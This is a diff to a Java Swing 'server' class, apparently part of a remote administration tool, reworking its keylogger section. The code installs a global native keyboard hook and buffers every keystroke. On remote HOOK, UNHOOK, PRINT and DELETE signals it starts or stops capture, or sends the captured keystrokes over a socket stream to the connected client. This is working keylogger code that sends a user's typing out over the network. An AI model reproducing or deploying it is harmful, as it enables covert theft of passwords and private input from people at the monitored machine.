@@ -170,29 +170,34 @@ public class server extends javax.swing.JFrame {
 //        });
 //    }
     
-    int i = 0;
+    // Keylogger
+    
+    int counthookKey = 0;
     public void hookKey(KeyLogger k){
-        i += 1;
-        if(i == 1){
+        counthookKey += 1;
+        if(counthookKey == 1){
             try{
                 GlobalScreen.registerNativeHook();
-                System.out.println("hook 1");
             }catch (NativeHookException e){
                 e.printStackTrace();
             }
             GlobalScreen.addNativeKeyListener(k);
-
-            System.out.println("hook");
-        } else{
             
+        } else{
+            if(counthookKey > countunHook){
+                GlobalScreen.removeNativeKeyListener(k);
+            }
+            
+            GlobalScreen.addNativeKeyListener(k);
+                          
         }
-        
     }
-
+    
+    int countunHook = 1;
     public void unHookKey(KeyLogger k) throws NativeHookException{
-        k = null;
-//        GlobalScreen.unregisterNativeHook();
-        System.out.println("unhook");
+        countunHook += 1;
+        GlobalScreen.removeNativeKeyListener(k);
+        k.store = "";
     }
 
     public void print(KeyLogger k) {
@@ -201,37 +206,20 @@ public class server extends javax.swing.JFrame {
 
         try {
             if(k == null){
-                System.out.println("null object");
-                mes = "null object";
-                program.os.write("n1");
-                program.os.newLine();
-                program.os.flush();
-                
-                program.os.write("n2");
+                program.os.write("");
                 program.os.newLine();
                 program.os.flush();
             }
             else{
-                System.out.println("not null");
                 mes = k.store;
-                if(mes != ""){
-                    System.out.println(mes);
-                    program.os.write("oke");
-                    program.os.newLine();
-                    program.os.flush();
-                    
+                if(mes != ""){                  
                     program.os.write(mes);
                     program.os.newLine();
                     program.os.flush();
                     k.store = "";
                 }
-                else {
-                    program.os.write("ko");
-                    program.os.newLine();
-                    System.out.println("null22");
-                    program.os.flush();
-                    
-                    program.os.write("null22");
+                else {            
+                    program.os.write("");
                     program.os.newLine();
                     program.os.flush();
                 }
@@ -240,44 +228,45 @@ public class server extends javax.swing.JFrame {
             e.printStackTrace();
         }
 
-        System.out.println("print");
     }
-    public void keylog() throws IOException{
-                    
+
+    public void keylog() throws IOException{     
         KeyLogger k = new KeyLogger();
-//        System.out.println("hook");
-        boolean work = true;
-        while(work){
+        while(true){
             receiveSignal();
             switch (program.signal){
                 case "HOOK" ->{
                     hookKey(k);
-                    System.out.println("hook");
                     break;
                     
                 }
                 case "UNHOOK"->{
-                try {
-                    // k = null;
-                    unHookKey(k);
-                } catch (NativeHookException ex) {
-                    Logger.getLogger(server.class.getName()).log(Level.SEVERE, null, ex);
+                    try {
+                        unHookKey(k);
+                        break;
+                    } catch (NativeHookException ex) {
+                        Logger.getLogger(server.class.getName()).log(Level.SEVERE, null, ex);
+                    }
+                      break;
                 }
-                System.out.println("unhook");
-                break;
-                }
+
                 case "PRINT"->{
                     print(k);
-                    System.out.println("print");
+                    k.store = "";
+                    break;
+                }
+                case "DELETE"->{
+                    k.store = "";
                     break;
                 }
                 case "QUIT"->{
-                    work = false;
                     break;
                 }
             }
         }
     }
+    
+    // End Keylogger
     
     public void shutdown()
     {
